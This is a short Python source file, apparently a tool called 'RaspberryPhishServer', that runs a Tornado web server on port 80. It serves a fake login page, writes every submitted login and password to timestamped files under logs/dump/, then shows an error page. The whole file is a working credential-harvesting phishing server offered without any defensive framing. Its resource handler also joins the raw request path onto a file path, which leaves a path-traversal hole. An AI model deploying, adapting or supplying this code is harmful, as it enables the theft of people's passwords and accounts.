#!/usr/bin/env python
# -*- coding: utf-8 -*-
__title__ = "RaspberryPhishServer"

# var : directory name where the server will load in "pages" and "rsc"
pagePath = "test/"


import tornado.ioloop
import tornado.web
import os.path
import time


# Handler for ressources
class RscHandler(tornado.web.RequestHandler):
    def get(self, path_request):
        self.write(open("rsc/" + pagePath + path_request, 'rb').read())


# Handler for HTML files
class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.render("pages/" + pagePath + "index.html")

    def post(self):
        try:
            login = self.get_argument("login")
            password = self.get_argument("password")
            name = time.time()
            file = open("logs/dump/"+str(name), mode="a+")
            file.write("login:" + login + "\npassword:" + password)
            file.close()
        except tornado.web.HTTPError:
            pass

        self.render("pages/" + pagePath + "error.html")


if __name__ == "__main__":
    # create an instance
    application = tornado.web.Application(
        [
            (r'/rsc/(.*)$', RscHandler),
            (r"/", MainHandler),
            (r"/*", MainHandler),
            (r"/.*", MainHandler),
        ],
        autoreload=True, debug=True
    )

    # bind a port
    application.listen(80)

    # loop forever for satisfy user's requests
    tornado.ioloop.IOLoop.instance().start()
